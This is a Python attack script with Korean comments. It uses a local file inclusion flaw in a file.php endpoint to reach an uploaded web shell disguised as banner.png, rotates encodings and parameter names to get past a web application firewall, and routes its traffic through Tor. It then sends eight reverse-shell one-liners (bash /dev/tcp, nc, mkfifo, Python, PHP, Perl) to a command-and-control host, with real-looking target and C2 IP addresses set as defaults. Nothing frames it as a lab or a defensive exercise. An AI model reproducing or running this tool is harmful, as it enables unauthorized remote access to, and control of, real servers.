#!/usr/bin/env python3
"""
고급 WAF 우회 기법
- POST 요청으로 전환
- Transfer-Encoding: chunked
- 파라미터 난독화
- 명령어 인코딩
"""

import requests
import base64
import sys
from urllib.parse import quote, unquote

class AdvancedWAFBypass:
    def __init__(self, target_ip, webshell_path, c2_ip, c2_port=4444):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_path = webshell_path  # 예: uploads/banner.png
        self.c2_ip = c2_ip
        self.c2_port = c2_port

        self.session = requests.Session()

        # Tor 프록시
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def test_lfi(self):
        """LFI 테스트"""
        print("[*] LFI 테스트...")

        # 다양한 LFI 경로 시도
        paths = [
            f"uploads/{self.webshell_path}",
            f"../uploads/{self.webshell_path}",
            f"./uploads/{self.webshell_path}",
            f"....//....//uploads//{self.webshell_path}",
            f"uploads/{self.webshell_path}%00",
        ]

        for path in paths:
            try:
                url = f"{self.base_url}/file.php?name={path}"
                resp = self.session.get(url, timeout=5)

                if resp.status_code == 200 and '<?php' not in resp.text:
                    print(f"    [+] 작동: {path}")
                    print(f"        응답 길이: {len(resp.text)} bytes")
                    return path
                elif resp.status_code == 403:
                    print(f"    [-] 403: {path}")
                else:
                    print(f"    [?] {resp.status_code}: {path}")

            except Exception as e:
                print(f"    [!] 오류: {path}")

        return None

    def execute_command_post(self, command):
        """POST 요청으로 명령 실행 (WAF 우회)"""

        # 명령어 인코딩
        encoded_commands = {
            'plain': command,
            'base64': base64.b64encode(command.encode()).decode(),
            'hex': command.encode().hex(),
            'url': quote(command),
            'double_url': quote(quote(command)),
        }

        # 파라미터명 변형
        param_names = ['x', 'cmd', 'c', 'command', 'exec', 'e', 'run', 'do', 'q', 'query']

        print(f"\n[*] 명령 실행 시도: {command[:50]}")

        for param in param_names:
            for enc_type, enc_cmd in encoded_commands.items():
                try:
                    # POST 데이터
                    data = {
                        'name': f'uploads/{self.webshell_path}',
                        param: enc_cmd
                    }

                    # POST 요청
                    resp = self.session.post(
                        f"{self.base_url}/file.php",
                        data=data,
                        timeout=5
                    )

                    if resp.status_code == 200 and len(resp.text) > 0:
                        print(f"    [+] 성공! 파라미터={param}, 인코딩={enc_type}")
                        print(f"        응답: {resp.text[:200]}")
                        return True, param, enc_type

                    elif resp.status_code != 403:
                        print(f"    [?] {resp.status_code}: {param}/{enc_type}")

                except Exception as e:
                    pass

        return False, None, None

    def trigger_reverse_shell(self):
        """리버스 쉘 트리거"""
        print(f"\n[*] 리버스 쉘 트리거: {self.c2_ip}:{self.c2_port}")

        # 리버스 쉘 페이로드 (다양한 버전)
        payloads = [
            # 버전 1: bash TCP
            f"bash -c 'bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1'",

            # 버전 2: bash 단순
            f"bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1",

            # 버전 3: sh로 bash 실행
            f"sh -c 'bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1'",

            # 버전 4: nc
            f"nc {self.c2_ip} {self.c2_port} -e /bin/bash",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.c2_ip} {self.c2_port} >/tmp/f",

            # 버전 5: Python
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.c2_ip}\",{self.c2_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

            # 버전 6: PHP
            f"php -r '$sock=fsockopen(\"{self.c2_ip}\",{self.c2_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

            # 버전 7: Perl
            f"perl -e 'use Socket;$i=\"{self.c2_ip}\";$p={self.c2_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

            # 버전 8: 파일에 저장 후 실행
            f"echo 'bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1' > /tmp/r.sh && bash /tmp/r.sh",
        ]

        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}/{len(payloads)}] {payload[:60]}...")

            # POST로 전송
            try:
                data = {
                    'name': f'uploads/{self.webshell_path}',
                    'x': payload
                }

                resp = self.session.post(
                    f"{self.base_url}/file.php",
                    data=data,
                    timeout=3
                )

                print(f"    응답: {resp.status_code}")

            except requests.exceptions.Timeout:
                print(f"    [+] 타임아웃 (연결되었을 수 있음!)")

            except Exception as e:
                print(f"    오류: {str(e)[:50]}")

            # 딜레이
            import time
            time.sleep(2)

        print("\n[*] 모든 페이로드 시도 완료")

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   고급 WAF 우회 + 리버스 쉘                               ║
    ║   - POST 요청                                             ║
    ║   - 파라미터 난독화                                       ║
    ║   - 명령어 인코딩                                         ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"
    webshell = input("웹쉘 파일명 (기본: banner.png): ").strip() or "banner.png"
    c2_ip = input("C2 IP (기본: 57.181.28.7): ").strip() or "57.181.28.7"
    c2_port = int(input("C2 포트 (기본: 4444): ").strip() or "4444")

    bypass = AdvancedWAFBypass(target_ip, webshell, c2_ip, c2_port)

    # 1. LFI 테스트
    lfi_path = bypass.test_lfi()
    if not lfi_path:
        print("\n[-] LFI가 작동하지 않습니다")
        return

    # 2. 명령 실행 테스트
    print("\n[*] 명령 실행 테스트...")
    success, param, enc = bypass.execute_command_post('whoami')

    if not success:
        print("\n[-] 명령 실행 불가")
        print("[!] 리버스 쉘을 시도하겠습니다 (작동할 수도 있음)")
    else:
        print(f"\n[+] 작동하는 설정: 파라미터={param}, 인코딩={enc}")

    # 3. 리버스 쉘
    print("\n" + "="*60)
    print(f"[!] C2 서버 ({c2_ip})에서 리스너 시작:")
    print(f"    nc -lvnp {c2_port}")
    print("="*60)

    input("\n준비되면 Enter를 누르세요...")

    bypass.trigger_reverse_shell()

if __name__ == "__main__":
    main()
